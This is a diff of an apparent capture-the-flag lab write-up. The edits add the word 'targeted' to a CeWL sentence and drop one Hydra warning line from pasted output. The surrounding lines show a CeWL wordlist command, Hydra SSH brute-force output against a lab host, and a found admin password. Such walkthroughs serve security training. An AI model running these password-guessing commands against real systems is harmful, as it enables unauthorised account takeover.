@@ -39,7 +39,7 @@ Doing so discovers the login credentials of `username=admin&password=`**12345**.
 
 ### What is the password for Level 2?
 
-Use `CeWL` to generate a wordlist of discovered keywords from `http://jobs.thm:5002`.
+Use `CeWL` to generate a targeted wordlist of discovered keywords from `http://jobs.thm:5002`.
 
 ```bash
 cewl -d 0 -m 3 --with-numbers -w words.txt http://jobs.thm:5002
@@ -182,7 +182,6 @@ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in mi
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task
 [DATA] attacking ssh://thm:22/
 [STATUS] 125.00 tries/min, 125 tries in 00:01h, 376 to do in 00:04h, 15 active
